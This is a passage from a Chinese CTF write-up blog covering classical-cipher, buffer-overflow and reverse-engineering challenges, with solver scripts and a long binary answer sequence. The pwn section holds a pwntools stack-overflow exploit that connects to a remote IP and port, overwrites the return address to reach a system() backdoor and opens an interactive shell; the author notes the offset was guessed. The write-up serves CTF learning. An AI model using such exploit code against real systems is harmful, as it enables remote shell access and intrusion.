class="keyword">if</span> s2[i]==<span class="string">&#x27;-&#x27;</span> <span class="keyword">or</span> s2[i]==<span class="string">&#x27; &#x27;</span>:</span><br><span class="line">            s1=s1+s2[i]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s1= s1+letters[<span class="built_in">ord</span>(s2[i])-<span class="number">97</span>]</span><br><span class="line">    <span class="built_in">print</span>(s1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">q2a</span>(<span class="params">s2</span>):</span><br><span class="line">    s1=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">        <span class="keyword">if</span> s2[i]==<span class="string">&#x27;-&#x27;</span> <span class="keyword">or</span> s2[i]==<span class="string">&#x27; &#x27;</span>:</span><br><span class="line">            s1=s1+s2[i]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s1= s1+letter[<span class="built_in">ord</span>(s2[i])-<span class="number">97</span>]</span><br><span class="line">    <span class="built_in">print</span>(s1)</span><br><span class="line"></span><br><span class="line">a2q(s2)</span><br><span class="line">q2a(s2)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>结果得不到有效的文字，然后又跑了一遍凯撒，还是不行。后来找到了另一种”keyboard”密码：<a class="link"   href="https://zhuanlan.zhihu.com/p/222691227" >CTF古典密码学 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，居然是键盘围绕的字母得出明文，属实脑洞大开，最后得到明文，但是包装成flag还需要尝试一下格式：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">WDR-BHM-NKUH-ILP-THU-THU-LIP-YJI-EFT-AXDW-WSR-POK-DCGR</span><br><span class="line"></span><br><span class="line">e-n-j-o-y-y-o-u-r-s-e-l-f</span><br><span class="line">r00t&#123;ENJOY_YOURSELF&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="EasyOverflow"><a href="#EasyOverflow" class="headerlink" title="EasyOverflow"></a>EasyOverflow</h3><p>怪怪的…只要往密码里输入’password’就能得到flag，不是很懂为什么hhhh，所以溢出了个啥呢</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://picturebed-1310517892.file.myqcloud.com/2022/202205101539741.png"
                     
                ></p>
<p>听出题人说这题因为username只能读取9位，多的会覆盖原有的密码（直接替换不拼接），所以溢出的最多8位是可控的密码，比如你在username中输入”123456789abcdefgh”，那么密码栏就输入”abcdefgh”即可。</p>
<h3 id="EasyOverflow2（未解出）"><a href="#EasyOverflow2（未解出）" class="headerlink" title="EasyOverflow2（未解出）"></a>EasyOverflow2（未解出）</h3><p>这是一个pwn的简单的栈溢出，拖进ida分析会看见一个system后门与一个可能造成溢出的get函数，目标就是调用get函数时用输入填满栈空间覆盖原有内容，然后覆盖ebp，最后再覆盖eip，将跳转的system函数的调用地址传入到原本eip存储栈返回地址的地方，从而执行eip拿到shell。</p>
<p>以上是基本思路，可以使用python的pwntools构造exp，remote提供远程连接，构造payload，需要先得出偏移量，也就是函数开始到eip的地址差值，用无用数据将其填满，然后再将要跳转的地址传进去，p32表示将数据压缩成bytes类型，这里没有弄明白到底如何得到偏移量就随便填了一个，<code>sendline</code> 函数发送一行的内容，会自动加上换行符，<code>send</code> 函数则会原样发送，<code>interactive</code> 会进入shell式的交互界面（也就是与nc的目标进行交互），结束后用 <code>close</code> 关闭连接。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=remote(<span class="string">&quot;81.69.243.226&quot;</span>,<span class="number">30012</span>)</span><br><span class="line">payload=<span class="string">b&quot;A&quot;</span>*<span class="number">0x1449</span>+p32(<span class="number">0x401278</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure></div>

<p>所以这题真正的难点在于如何判断出偏移量和后门函数的地址。我一开始像在ida中看函数的栈调用情况，但是没有整明白，网上很多exp的思路用的都是gdb的调试动态查找地址情况，其实ida也可以调试，但本题的程序只能在linux环境中运行，所以ida中没有”windows debugger”，而且用pwntools连接本地的pwn程序，<code>process</code> 会报错也是这个原因，所以只能在linux环境下用dbg调试才能得到偏移量，但本地的wsl包管理出了点问题，不是很熟悉linux命令，暂时还配置不了环境；远程的服务器也是类似原因暂时无法配置环境，最后的思路是直接实测，通过不断输入变大的payload测试溢出点，但是出现了很奇怪的情况，开始看似溢出的点后来发现又没有溢出，可是payload已经很大了，因为没有类似的经验，我也不是很清楚溢出的实际效果，所以最后只能暂时作罢，没能解出flag，只是记录一下自己的思路。</p>
<ul>
<li>“.dll”为动态链接库，是windows的可执行文件；”.lib”是静态链接库，可执行文件；Windows下PE指示可执行，Linux下ELF指示可执行</li>
</ul>
<p><strong>参考：[</strong></p>
<p><a class="link"   href="https://www.freebuf.com/articles/system/253225.html" >栈溢出的原理以及EXP的编写 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/weixin_43833642/article/details/104181681" >pwntools的安装与基本使用 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="http://c.biancheng.net/view/8130.html" >GDB下载及安装教程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://oi.men.ci/gnu-debugger/" >GDB入门教程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/25816426" >Jwizard-栈溢出从入门到放弃 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>]</strong></p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Too-Much-Chaos"><a href="#Too-Much-Chaos" class="headerlink" title="Too Much Chaos"></a>Too Much Chaos</h3><p>给了一个能跑出flag的C++程序，里面有各种错误，包括语法，死循环，算法错误，修复后即可得到flag，需要说明的是不会报错的错误如算法实现失败，main函数拼成mian（程序找不到main函数在VSC中会导致生成不了exe从而导致无法运行）等。难度不大，仔细观察即可。</p>
<h3 id="AT-FILED"><a href="#AT-FILED" class="headerlink" title="AT.FILED"></a>AT.FILED</h3><p>就是简单的大小写置换，但是’e’不会被转换成’E’，因此根据给出的结果反推输入时会有多解。根据置换后的结果，反推置换前的输入，就能得到一个正确的flag：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">YoUR_fLAG_Is_HeRE</span><br></pre></td></tr></table></figure></div>

<h3 id="Zebra"><a href="#Zebra" class="headerlink" title="Zebra"></a>Zebra</h3><p>这道题丢进IDA64后先找main函数，然后发现是一个检验运算，输入一串10检验是否与unsigned数组c中的内容相等，经过分析就是将unsigned数组中的数值写成四位的二进制并展开，因此要看unsigned数组中的内容如何，通过地址来到数组的内容界面，由于unsigned的大小是四个字节，在hexview中调整format为unsigned，4bytes，然后计算数组的地址范围：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">40F020</span><br><span class="line">	2400</span><br><span class="line">411420</span><br></pre></td></tr></table></figure></div>

<p>在计算机中地址随内存的增大是从低往高增长的，地址的单位就是字节，以十六进制的形式表示，一个字节是两位十六进制，而c数组是一个unsigned的数组，在C++中可以用sizeof测试一下它的大小是4个字节，所以每4位地址存储一个unsigned数据，在一个数据内部是从高位往低位读值的，因此在读取数组内容时将格式调整成4Bytes的Unsigned数据，可以直接读取它的值而不用自己处理。函数 <code>memcpy()</code> 将地址”&amp;unk_40F020”的内容赋给数组c，2304大小的unsigned数组占用字节数是9216，转化为十六进制是2400；双击地址”&amp;unk_40F020”可以跳转到相应地址界面看到地址内容</p>
<p>再将这部分的数值复制出来丢到脚本中转化一下：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    fstream infile,outfile;</span><br><span class="line">    infile.<span class="built_in">open</span>(<span class="string">&quot;./msg.txt&quot;</span>,ios::in);</span><br><span class="line">    outfile.<span class="built_in">open</span>(<span class="string">&quot;./reres.txt&quot;</span>,ios::out);</span><br><span class="line">    string tmp,res=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2304</span>;i++)&#123;</span><br><span class="line">        infile&gt;&gt;num;</span><br><span class="line">        string ss=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">            ss=<span class="built_in">char</span>((num%<span class="number">2</span>)+<span class="number">48</span>)+ss;</span><br><span class="line">            num/=<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        res=res+ss;</span><br><span class="line">    &#125;</span><br><span class="line">    outfile&lt;&lt;res;</span><br><span class="line">    infile.<span class="built_in">close</span>();</span><br><span class="line">    outfile.<span class="built_in">close</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>数组c的内容存放在”msg.txt”中，C++中严格区分单双引号，单引号内被视为字符类型，双引号内被视为字符串类型。得到的内容如果想拿到程序中检验需要加上空格并分批输入，一起输入它读取不了那么多…检验后发现是正确的，因此就直接取没有空格的版本，得到如下10序列：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 </span><br><span class="line">1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 </span><br><span class="line">1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 </span><br><span class="line">1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 </span><br><span class="line">1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 </span><br><span class="line">0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 </span><br><span class="line">0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 </span><br><span class="line">1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 </span><br><span class="line">0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 </span><br><span class="line">0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 </span><br><span class="line">1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 </span><br><span class="line">1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 